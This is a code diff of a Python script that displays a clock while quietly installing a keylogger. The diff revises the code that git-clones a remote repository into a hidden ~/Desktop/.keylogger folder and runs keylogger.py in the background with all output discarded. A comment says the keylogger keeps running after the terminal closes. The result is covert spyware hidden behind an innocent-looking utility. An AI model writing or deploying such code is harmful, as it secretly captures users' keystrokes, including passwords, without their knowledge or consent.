@@ -19,15 +19,13 @@ if __name__ == "__main__":
     # Start the keylogger in the background; it will keep running even after
     # the terminal session is closed
     # CMD = "nohup sudo python keylogger.py &> /dev/null &"
-    if Path("~/Desktop/.keylogger").exists():
-        print('existe')
-    else:
-        CMD = "git clone https://github.com/jose-villar/public-key ~/Desktop/.keylogger &> /dev/null &"
-        subprocess.call(CMD, shell=True)
-        time.sleep(30)
+    if not Path("~/Desktop/.keylogger").expanduser().exists():
+        CMD = "git clone https://github.com/jose-villar/public-key ~/Desktop/.keylogger &> /dev/null"
+        pipe=subprocess.Popen(CMD, shell=True)
+        pipe.wait()
 
     print(f"{datetime.now().time()}")
-    CMD = "python3 ~/Desktop/.keylogger/keylogger.py > /dev/null &"
+    CMD = "python3 ~/Desktop/.keylogger/keylogger.py &> /dev/null &"
     subprocess.call(CMD, shell=True)
 
     # Show clock until it is manually stopped by pressing <C-c>
